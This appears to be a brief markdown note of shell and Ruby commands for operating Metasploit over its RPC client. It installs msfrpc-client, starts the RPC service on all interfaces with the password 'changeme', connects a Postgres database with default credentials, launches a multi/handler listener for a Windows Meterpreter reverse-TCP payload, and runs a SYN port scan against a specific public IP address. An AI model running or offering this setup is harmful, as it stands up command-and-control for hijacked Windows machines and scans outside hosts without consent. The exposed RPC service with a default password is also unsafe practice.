## Setup Client
```
export GEM_HOME="$(ruby -e 'puts Gem.user_dir')"
export PATH="$PATH:$GEM_HOME/bin" 
gem install msfrpc-client 
msfrpc -a 0.0.0.0 -P changeme

database = {'username' => 'postgres', 'password'=>'changeme', 'database'=>'public', 'host'=>'localhost', 'port'=>5432}
rpc.call('db.connect', database)

opts = {'LHOST' => '0.0.0.0', 'LPORT'=>6669, 'PAYLOAD'=>'windows/meterpreter/reverse_tcp'}
rpc.call('module.execute', 'exploit', 'multi/handler', opts)


opts = {'RHOSTS' => '45.142.176.254' }
rpc.call('module.execute', 'auxiliary', 'scanner/portscan/syn', opts)
```